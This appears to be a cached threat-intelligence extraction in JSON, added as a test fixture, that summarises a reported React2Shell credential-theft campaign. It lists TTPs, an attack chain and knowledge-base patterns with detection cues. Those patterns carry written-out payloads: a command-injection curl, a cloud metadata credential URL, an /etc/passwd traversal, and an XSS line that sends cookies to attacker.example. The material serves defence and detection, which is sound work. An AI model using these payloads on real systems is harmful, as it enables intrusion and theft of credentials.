@@ -1,0 +1,138 @@
+{
+  "cached_at": "2026-04-13T04:41:32.638824+00:00",
+  "extraction": {
+    "signal_id": "verify-002",
+    "source_name": "test",
+    "article_url": "https://www.bleepingcomputer.com/news/security/hackers-exploit-react2shell-in-automated-credential-theft-campaign/",
+    "article_title": "Hackers Exploit React2Shell in automated credential theft campaign",
+    "pub_date": "2026-04-13T05:00:00Z",
+    "trust_score": 0.95,
+    "cves": [
+      "CVE-2025-55182"
+    ],
+    "iocs": {},
+    "threat_actors": [
+      "UAT-10608"
+    ],
+    "malware_families": [
+      "NEXUS Listener"
+    ],
+    "ttps": [
+      {
+        "mitre_id": "T1190",
+        "description": "Exploit public-facing web applications to gain initial access by abusing a vulnerable Next.js/React2Shell flaw."
+      },
+      {
+        "mitre_id": "T1005",
+        "description": "Data from Local System is harvested from compromised hosts, including secrets, keys, and credentials."
+      },
+      {
+        "mitre_id": "T1552.001",
+        "description": "Credential material is collected from files and configuration sources such as environment secrets, API keys, SSH keys, and token files."
+      },
+      {
+        "mitre_id": "T1119",
+        "description": "Automated collection is used to enumerate and exfiltrate sensitive data from many systems at scale."
+      }
+    ],
+    "attack_chain": [
+      "Scan for internet-exposed vulnerable Next.js applications",
+      "Exploit React2Shell to obtain code execution or unauthorized access",
+      "Drop an automated harvesting script into a temporary directory",
+      "Enumerate environment variables, credential stores, cloud metadata, and key files",
+      "Exfiltrate harvested secrets to attacker infrastructure"
+    ],
+    "target_industries": [],
+    "target_technologies": [
+      "Next.js",
+      "React",
+      "Node.js",
+      "AWS",
+      "GCP",
+      "Azure",
+      "Linux",
+      "cloud metadata services"
+    ],
+    "proposed_vectors": [
+      {
+        "id": "WEB-001",
+        "name_en": "Vulnerable Next.js React2Shell exploitation",
+        "name_ko": "취약한 Next.js React2Shell 악용",
+        "phase": "P4_cpr",
+        "risk": "high"
+      }
+    ],
+    "proposed_phase_updates": [],
+    "proposed_kb_patterns": [
+      {
+        "technique": "rce",
+        "attack_description": "A vulnerable Next.js component or server-side route is abused to trigger server-side execution, allowing an attacker to write and launch a harvesting script from a writable temporary directory.",
+        "payload": "curl -s http://127.0.0.1:3000/api/debug?cmd=sh -c 'id > /tmp/.r2s_probe; env | sort | head -n 20 > /tmp/.r2s_env' ",
+        "detect": [
+          "HTTP 200 from a previously unexposed debug or vulnerable endpoint",
+          "Creation of a temporary file such as /tmp/.r2s_probe or /tmp/.r2s_env",
+          "Response or logs showing command output like uid=, gid=, or environment variable names"
+        ],
+        "affected_tech": [
+          "Next.js",
+          "Node.js",
+          "Linux"
+        ],
+        "severity": "critical"
+      },
+      {
+        "technique": "ssrf",
+        "attack_description": "If server-side request primitives are reachable through the vulnerable app, an attacker can force the application to query internal metadata endpoints to collect cloud credentials and instance identity information.",
+        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "detect": [
+          "Outgoing request to 169.254.169.254 or equivalent metadata IP",
+          "Response contains IAM role name, token, or instance metadata",
+          "Application logs indicate unexpected internal URL fetching"
+        ],
+        "affected_tech": [
+          "Next.js",
+          "Node.js",
+          "AWS",
+          "GCP",
+          "Azure"
+        ],
+        "severity": "high"
+      },
+      {
+        "technique": "path_traversal",
+        "attack_description": "A file-reading flaw in the app or script handling can be used to access configuration files and secret stores outside the intended directory, exposing keys and tokens.",
+        "payload": "../../../../../../etc/passwd",
+        "detect": [
+          "Returned file contents instead of an application error",
+          "Successful retrieval of /etc/passwd or similar system files",
+          "Log entries showing normalized traversal paths"
+        ],
+        "affected_tech": [
+          "Next.js",
+          "Node.js",
+          "Linux"
+        ],
+        "severity": "high"
+      },
+      {
+        "technique": "xss",
+        "attack_description": "If the application reflects untrusted input into administrative or telemetry views without encoding, attacker-controlled script can run and steal session or secret material from operator consoles.",
+        "payload": "<svg/onload=fetch('https://attacker.example/x?c='+document.cookie)>",
+        "detect": [
+          "Script execution in browser",
+          "Unexpected outbound request to attacker-controlled domain",
+          "Session or CSRF token theft indicators in browser logs"
+        ],
+        "affected_tech": [
+          "React",
+          "Next.js",
+          "browser"
+        ],
+        "severity": "medium"
+      }
+    ],
+    "proposed_waf_variants": [],
+    "proposed_actor_updates": [],
+    "extracted_at": "2026-04-13T04:41:32.638689+00:00"
+  }
+}
